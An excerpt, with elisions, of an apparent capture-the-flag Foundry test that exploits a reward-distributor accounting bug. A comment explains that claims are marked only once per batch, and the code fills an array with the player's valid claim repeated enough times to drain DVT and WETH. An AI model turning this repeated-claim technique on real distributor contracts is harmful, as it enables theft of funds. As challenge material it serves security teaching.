...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        // Aegis sweep -> SC02 accounting: claimRewards transfers on EVERY loop iteration but only marks
        // the claimed-bitmap once (on token change / last). Repeat the player's own valid claim to drain.
        ...
        uint256 nDvt = dvt.balanceOf(address(distributor)) / PLAYER_DVT;
        uint256 nWeth = weth.balanceOf(address(distributor)) / PLAYER_WETH;
        ...
        for (uint256 i = 0; i < nDvt; i++) {
            claims[i] = Claim({batchNumber: 0, amount: PLAYER_DVT, tokenIndex: 0, proof: dvtProof});
        }
        for (uint256 i = 0; i < nWeth; i++) {
            claims[nDvt + i] = Claim({batchNumber: 0, amount: PLAYER_WETH, tokenIndex: 1, proof: wethProof});
        }
